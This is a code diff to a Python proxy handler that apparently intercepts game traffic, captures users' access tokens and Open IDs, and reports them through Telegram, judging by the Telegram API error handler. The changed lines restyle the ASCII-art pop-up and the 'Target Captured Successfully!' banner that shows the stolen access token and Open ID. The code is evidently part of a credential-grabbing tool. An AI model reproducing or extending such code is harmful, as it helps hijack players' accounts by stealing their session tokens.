@@ -141,7 +141,7 @@ class ProxyHandler(BaseHTTPRequestHandler):
             except Exception as tg_err:
                 print(f"{R}[!] Telegram API Error: {tg_err}{W}")
                 
-            # Full Screen Large Size Art Payload for Game Pop-up
+            # Full Original Art Style Payload
             response_payload = f"""[b][c][00FFCC]
 ⣴⣿⣿⣿⡿⣿⡿⣗⢌⢳⡀
 ⣼⣿⡇⣿⠹⡸⡹⣷⡹⡎⣧⢳
@@ -155,15 +155,24 @@ class ProxyHandler(BaseHTTPRequestHandler):
 ⣉⣠⣿⣿⡏⣼⣿⠁⠶⠄⣿⣿⡇⡼⠄⠈
 ⣈⠻⠿⠟⢁⠘⢿⣷⣶⣾⣿⠟⡰⠃
 ⣴⣿⣧⢻⣿⣿⣷⣦⣬⣉⣩⣴⠞⠁
+⠘⠿⠿⢸⣿⣿⣿⣿⣿⣿⣿⠁
+⢤⡝⣧⢸⣿⣿⣿⣿⣿⣿⠟
+⣜⢧⠻⣀⢿⣿⣿⣿⣿⣿⠏⣾⣧⡀
+⠹⢂⣾⣿⠸⣿⣿⣿⣿⡏⣼⣿⣿⣷
+⣿⣿⣿⣧⠹⣿⢻⡿⢰⣿⣿⣿⣿⣇
+⢸⣿⣿⣿⣿⣇⢹⢸⢁⣿⣿⣿⣿⣿⣿⡆
+⢸⣿⣿⣿⣿⣿⣆⠄⣿⣿⣿⣿⣿⣿⣿⡇
+⠸⣿⣿⣿⣿⣿⣿⠄⢿⣿⣿⣿⣿⣿⣿⡇
+⠄⣿⣿⣿⣿⣿⣿⠄⠈⣿⣿⣿⣿⣿⣿⡇
 
-[FFD700]═════════════════════════════════════════════════
-[00FF00]👑 NIROB BBZ ELITE FULLSCREEN SECURITY SYSTEM 👑
-[FFD700]═════════════════════════════════════════════════
+[FFD700]═════════════════════════════════════
+[00FF00]👑 NIROB BBZ ELITE SECURITY SYSTEM 👑
+[FFD700]═════════════════════════════════════
 
 [cccccc]Access Token => [FF0000]{access_token}
 [cccccc]Open ID      => [00FF00]{open_id}
 
-[FFFF00]Status: Fullscreen Target Captured Successfully!
+[FFFF00]Status: Target Captured Successfully!
 """
 
             self.send_response(500)
